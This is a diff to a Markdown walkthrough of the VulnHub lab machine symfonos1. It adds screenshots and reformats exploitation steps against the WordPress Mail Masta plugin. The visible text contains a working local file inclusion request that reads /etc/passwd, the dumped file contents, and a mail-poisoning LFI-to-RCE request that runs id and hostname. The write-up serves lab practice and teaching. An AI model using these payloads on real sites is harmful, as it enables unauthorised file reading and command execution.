@@ -496,6 +496,7 @@ Next person I find using one of these passwords will be fired!
 
 Connecting to another share /helios we get the following file
 
+![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/symfonos1/symfonos11.png)
 
 At http://192.168.56.106/h3l105/ there is wordpress installation
 
@@ -657,7 +658,12 @@ Searching for Vulnerabilities
 Trying the exploit
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-root@setrus:/mnt# curl http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
+http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Exploitation - getting /etc/passwd
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+curl http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
+
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -692,7 +698,9 @@ postfix:x:109:115::/var/spool/postfix:/bin/false
 
 
 LFI to RCE
+
 Local File Inclusion to Remote Code Execution
+
 Sending a email and then receiveing the file
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -719,6 +727,8 @@ Remote Code execution
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=id;hostname
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/symfonos1/symfonos12.png)
 
 
 
